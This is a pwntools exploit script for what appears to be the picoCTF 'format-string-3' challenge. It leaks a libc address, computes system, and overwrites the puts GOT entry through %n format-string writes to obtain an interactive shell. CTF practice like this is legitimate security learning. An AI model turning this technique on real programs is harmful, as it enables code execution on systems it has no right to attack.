from pwn import *

def addr(output):
    return int(output.decode().strip(), 16)

def payload(n):
    return b'%' + f'{n:014}x'.encode()

bin = ELF('./format-string-3')
got = bin.got.puts

p = remote('rhea.picoctf.net', 49959)
p.recvuntil("Here's the address of setvbuf in libc: ")

setvbuf = addr(p.recvline())
sys = setvbuf - 0x2AC90

sys_lo_3 = (sys & 0xFF)
sys_lo_2 = (sys & 0xFFFF00) >> 8
sys_lo_1 = (sys & 0xFFFFFFFF000000) >> 24

exploit = payload(sys_lo_3) + b'%47$hhnA'
exploit += payload(sys_lo_2 - (sys_lo_3+1)) + b'%48$hnAA'
exploit += payload(sys_lo_1 - (sys_lo_2 +2)) + b'%49$nAAA'
exploit += p64(got) + p64(got+1) + p64(got+3)

p.sendline(exploit)
p.interactive()
